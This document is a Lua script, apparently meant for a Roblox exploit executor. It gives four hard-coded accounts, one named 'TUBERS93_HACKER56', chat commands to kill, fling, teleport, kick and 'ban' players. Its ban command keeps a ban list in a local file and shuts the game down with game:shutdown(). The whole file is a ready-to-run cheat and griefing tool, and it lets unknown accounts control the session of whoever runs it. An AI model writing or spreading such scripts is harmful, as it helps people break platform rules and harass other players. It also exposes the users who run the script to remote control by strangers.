-- script create BY ghost
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")

local ADMINS = {
	["admin202078"] = true,
	["BK_FAXBR"] = true,
	["kit_cynALT"] = true,
	["TUBERS93_HACKER56"] = true
}

local BAN_FILE = "banlist.txt"
local BanList = {}

if isfile(BAN_FILE) then
	local data = readfile(BAN_FILE)
	for name in string.gmatch(data, "([^,]+)") do
		BanList[name] = true
	end
else
	writefile(BAN_FILE,"")
end

local function saveBanList()
	local t = {}
	for n in pairs(BanList) do
		t[#t+1] = n
	end
	writefile(BAN_FILE,table.concat(t,","))
end

local function isAdmin(p)
	return p and ADMINS[p.Name]
end

local function findPlayerByName(q)
	if not q then return end
	q = q:lower()

	for _,p in pairs(Players:GetPlayers()) do
		if p.Name:lower()==q or (p.DisplayName and p.DisplayName:lower()==q) then
			return p
		end
	end

	for _,p in pairs(Players:GetPlayers()) do
		if p.Name:lower():find(q) or (p.DisplayName and p.DisplayName:lower():find(q)) then
			return p
		end
	end
end

local function kickPlayer(target,reason)
	if not target then return end
	pcall(function()
		target:Kick(reason or "Expulso pelo admin")
	end)
end

local function killPlayer(target)
	local char = target and target.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if hum then hum.Health = 0 end
end

local function sendChatMessage(msg)
	local cfg = TextChatService.ChatInputBarConfiguration
	if cfg and cfg.TargetTextChannel then
		cfg.TargetTextChannel:SendAsync(msg)
	end
end

local function bringPlayer(admin,target)
	local a = admin.Character
	local t = target.Character
	if not a or not t then return end

	local aHRP = a:FindFirstChild("HumanoidRootPart")
	local tHRP = t:FindFirstChild("HumanoidRootPart")

	if aHRP and tHRP then
		tHRP.CFrame = aHRP.CFrame * CFrame.new(0,0,-2)
	end
end

local function flingPlayer(target,min,max)
	local hrp = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
	if not hrp then return end

	local dir = Vector3.new(math.random(-1,1),math.random(1,2),math.random(-1,1)).Unit

	local bv = Instance.new("BodyVelocity")
	bv.Velocity = dir * math.random(min or 40,max or 80)
	bv.MaxForce = Vector3.new(1e6,1e6,1e6)
	bv.Parent = hrp

	game.Debris:AddItem(bv,0.5)
end

local Commands = {}

local function addCommand(name,func)
	Commands[name] = func
end

addCommand("kill",function(admin,args)
	local alvo = findPlayerByName(args)
	if alvo then killPlayer(alvo) end
end)

addCommand("bring",function(admin,args)
	local alvo = findPlayerByName(args)
	if alvo then bringPlayer(admin,alvo) end
end)

addCommand("fling",function(admin,args)
	local alvo = findPlayerByName(args)
	if alvo then flingPlayer(alvo) end
end)

addCommand("kick",function(admin,args)
	local name,reason = args:match("^(%S+)%s*(.*)$")
	local alvo = findPlayerByName(name)

	if alvo then
		sendChatMessage("sucess")
		task.wait(0.2)
		kickPlayer(alvo,reason ~= "" and reason or nil)
	end
end)

addCommand("ban",function(admin,args)
	local alvo = findPlayerByName(args)

	if alvo then
		BanList[alvo.Name] = true
		saveBanList()

		sendChatMessage("✔️")
		task.wait(0.2)

		kickPlayer(alvo,"voce foi banido do script : tempo PERM")
		task.wait(4)

		game:shutdown()
	end
end)

local function onChat(player,msg)
	if not isAdmin(player) then return end

	local cmd,args = msg:match("^%s*;(%S+)%s*(.*)$")
	if not cmd then return end

	cmd = cmd:lower()

	local c = Commands[cmd]
	if c then
		c(player,args)
	end
end

for _,p in pairs(Players:GetPlayers()) do
	p.Chatted:Connect(function(m)
		onChat(p,m)
	end)

	if BanList[p.Name] then
		kickPlayer(p,"vc foi banido do script permamente")
	end
end

Players.PlayerAdded:Connect(function(p)

	p.Chatted:Connect(function(m)
		onChat(p,m)
	end)

	if BanList[p.Name] then
		kickPlayer(p,"vc foi do script permanente")
		task.wait(3)
		game:shutdown()
	end
end)

